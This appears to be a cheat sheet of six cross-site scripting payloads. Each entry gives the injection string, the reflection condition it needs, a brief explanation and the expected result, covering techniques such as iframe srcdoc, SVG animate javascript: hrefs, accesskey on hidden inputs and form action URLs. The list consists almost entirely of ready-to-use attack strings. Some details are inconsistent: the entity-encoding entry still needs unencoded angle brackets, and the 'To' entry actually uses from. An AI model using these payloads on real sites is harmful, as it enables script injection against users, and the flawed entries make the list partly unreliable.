1. XSS with Iframe srcdoc Attribute
- Payload: <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: The srcdoc attribute of an iframe specifies the HTML content of the iframe. Inject an img tag with onerror inside srcdoc to execute JavaScript
- Output: <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>

---

2. XSS with Iframe srcdoc and HTML Entities
- Payload: <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
- Condition: Input is reflected into HTML where angle brackets (< >) ARE encoded but HTML entities are allowed
- Case: Use HTML entities inside the srcdoc attribute. The browser decodes the entities and renders the img tag inside the iframe
- Output: <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>

---

3. XSS with Accesskey on Hidden Inputs
- Payload: <input type="hidden" accesskey="X" onclick="alert(1)">
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is a hidden field
- Case: Hidden inputs are normally not exploitable, but the accesskey attribute can enable XSS. Press ALT+SHIFT+X (Windows) or CTRL+ALT+X (Mac) to trigger the onclick event
- Output: <input type="hidden" accesskey="X" onclick="alert(1)">

---

4. XSS with SVG Animate Tag using Values
- Payload: <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Use the SVG animate tag to set the href attribute of an anchor element to a javascript: URL via the values attribute
- Output: SVG animate sets href to javascript:alert(1), clicking the text triggers XSS

---

5. XSS with SVG Animate Tag using To
- Payload: <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Use the SVG animate tag with the from attribute to set the href to a javascript: URL
- Output: SVG animate sets href to javascript:alert(1), clicking the text triggers XSS

---

6. XSS with Form Action JavaScript URL
- Payload: <form action="javascript:alert(1)"><input type="submit"></form>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Form action attribute accepts javascript: URL, bypasses filters that block event handlers
- Output: <form action="javascript:alert(1)"><input type="submit"></form> → clicking submit triggers alert(1)
